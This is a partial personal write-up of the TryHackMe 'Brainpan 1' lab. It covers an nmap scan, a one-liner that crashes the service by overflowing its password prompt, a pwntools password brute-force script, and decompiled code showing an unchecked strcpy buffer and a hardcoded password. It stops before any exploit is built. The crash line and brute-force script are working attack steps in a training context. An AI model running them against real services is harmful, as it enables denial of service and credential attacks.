# Tryhackme.com Room : Brainpan 1
`https://tryhackme.com/room/brainpan`

## Instance

```bash
export IP='10.10.12.228'
```

## Nmap

```
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
```

## Initial Foothold

Ports `:10000` give us an `index.html` page with a nice infographic about security practices.

We can connect to port `9999`  using `nc` and we are asked for a "password".

First thing I tried was to overflow the password with 

```
echo $(python -c 'print("A"*519)') | nc 10.10.12.228 9999
```

And it did work, the service went down for a minute (probably restarted via a cron job).



I tried to bruteforce the password using this small python script 

```python
from pwn import *

ip = '10.10.12.228'
wordlist = "/usr/share/wordlists/rockyou_no_unicode.txt"

def try_pass(passwd):
	r = remote(ip, 9999)
	r.recv()
	r.send(passwd)
	resp = r.recv(timeout=1)

	print(resp.decode().strip())
	r.close()

	return len(resp) > 0 and b'DENIED' not in resp


with open(wordlist, 'r') as f:
	words = f.readlines()

for w in words:
	w = w.strip()

	if try_pass(w):
		print("FOUNDD ---- ", w)
		break
```

But it didn't work, and it is not the goal of this box anyways.



I'll be honest, at this point I did peak into a write up. 

I don't know why I didn't think to look at the webserver on port `:10000`...

Anyways, running `gobuster` on port `10000` we find the `:10000/bin` directory with the `brainpan.exe` binary.



We launch it in `ghidra`  and we endup finding a function called `_get_reply` :

```c
void __cdecl _get_reply(char *param_1)

{
  size_t sVar1;
  char local_20c [520];
  
  _printf("[get_reply] s = [%s]\n",param_1);
  _strcpy(local_20c,param_1);
  sVar1 = _strlen(local_20c);
  _printf("[get_reply] copied %d bytes to buffer\n",sVar1);
  _strcmp(local_20c,"shitstorm\n");
  return;
}
```



From there is pretty obvious that the password is `shitstorm`. We confirm this by trying it on the server and we get `ACCES GRANTED`... but the connection is dropped.



We need to do trigger a `buffer overflow` somehow.

The problem is that this binary is a `windows` binary and we are running on `linux`.

Not sure if the box run `linux` or `window` tho.



We can run the program using `wine ./brainpan.exe`

